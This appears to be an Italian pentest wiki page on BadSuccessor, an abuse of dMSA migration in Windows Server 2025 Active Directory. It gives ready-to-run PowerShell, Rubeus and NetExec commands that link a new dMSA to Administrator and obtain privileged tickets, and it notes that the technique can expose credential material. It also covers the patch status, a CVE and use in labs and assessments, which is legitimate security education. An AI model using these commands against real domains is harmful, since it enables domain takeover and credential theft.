# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

**BadSuccessor** abusa del workflow di migrazione del **delegated Managed Service Account** (**dMSA**) introdotto in **Windows Server 2025**. Un dMSA può essere collegato a un account legacy tramite **`msDS-ManagedAccountPrecededByLink`** e spostato attraverso gli stati di migrazione memorizzati in **`msDS-DelegatedMSAState`**. Se un attacker può creare un dMSA in una OU scrivibile e controllare quegli attributi, il KDC può emettere ticket per il dMSA controllato dall'attacker con il **context di authorization dell'account collegato**.

In pratica questo significa che un utente a basso privilegio che ha solo diritti delegati sulla OU può creare un nuovo dMSA, puntarlo su `Administrator`, completare lo stato di migrazione e poi ottenere un TGT il cui PAC contiene gruppi privilegiati come **Domain Admins**.

## Dettagli di migrazione dMSA che contano

- dMSA è una feature di **Windows Server 2025**.
- `Start-ADServiceAccountMigration` imposta la migrazione nello stato **started**.
- `Complete-ADServiceAccountMigration` imposta la migrazione nello stato **completed**.
- `msDS-DelegatedMSAState = 1` significa migrazione avviata.
- `msDS-DelegatedMSAState = 2` significa migrazione completata.
- Durante la migrazione legittima, il dMSA è pensato per sostituire in modo trasparente l'account superato, quindi il KDC/LSA preservano l'accesso che il precedente account aveva già.

Microsoft Learn nota anche che durante la migrazione l'account originale è legato al dMSA e il dMSA è destinato ad accedere a ciò a cui il vecchio account poteva accedere. Questa è la security assumption che BadSuccessor abusa.

## Requisiti

1. Un dominio in cui esiste **dMSA**, il che significa che il supporto **Windows Server 2025** è presente sul lato AD.
2. L'attacker può **creare** oggetti `msDS-DelegatedManagedServiceAccount` in qualche OU, oppure ha diritti equivalenti e ampi di creazione di child-object lì.
3. L'attacker può **scrivere** gli attributi dMSA rilevanti o controllare completamente il dMSA che ha appena creato.
4. L'attacker può richiedere Kerberos ticket da un contesto joined al domain o da un tunnel che raggiunge LDAP/Kerberos.

### Controlli pratici

Il segnale operativo più pulito è verificare il livello di domain/forest e confermare che l'ambiente stia già usando il nuovo stack Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Se vedi valori come `Windows2025Domain` e `Windows2025Forest`, tratta **BadSuccessor / dMSA migration abuse** come un controllo prioritario.

Puoi anche enumerare OU scrivibili delegate per la creazione di dMSA con public tooling:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Flusso di abuso

1. Crea una dMSA in una OU in cui hai diritti delegati di create-child.
2. Imposta **`msDS-ManagedAccountPrecededByLink`** sul DN di un target privilegiato come `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Imposta **`msDS-DelegatedMSAState`** su `2` per segnare la migrazione come completata.
4. Richiedi un TGT per la nuova dMSA e usa il ticket restituito per accedere ai servizi privilegiati.

Esempio PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Richiesta di ticket / esempi di strumenti operativi:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Perché questo è più di un privilege escalation

Durante una migrazione legittima, Windows deve anche far gestire al nuovo dMSA i ticket emessi per l'account precedente prima del cutover. Questo è il motivo per cui il materiale ticket-related di dMSA può includere chiavi **current** e **previous** nel flusso **`KERB-DMSA-KEY-PACKAGE`**.

Per un fake migration controllato da un attacker, quel comportamento può trasformare BadSuccessor in:

- **Privilege escalation** ereditando i SID dei gruppi privilegiati nel PAC.
- **Credential material exposure** perché la gestione della previous-key può esporre materiale equivalente all'RC4/NT hash del predecessore in workflow vulnerabili.

Questo rende la tecnica utile sia per un domain takeover diretto sia per operazioni successive come pass-the-hash o una compromissione più ampia delle credenziali.

## Note sullo stato della patch

Il comportamento originale di BadSuccessor **non è solo un problema teorico di preview 2025**. Microsoft ha assegnato **CVE-2025-53779** e ha pubblicato un aggiornamento di sicurezza nell'**agosto 2025**. Tieni documentato questo attacco per:

- **labs / CTFs / assume-breach exercises**
- **ambienti Windows Server 2025 non patchati**
- **validazione delle deleghe OU e dell'esposizione dMSA durante gli assessment**

Non assumere che un dominio Windows Server 2025 sia vulnerabile solo perché esiste dMSA; verifica il livello di patch e testa con attenzione.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
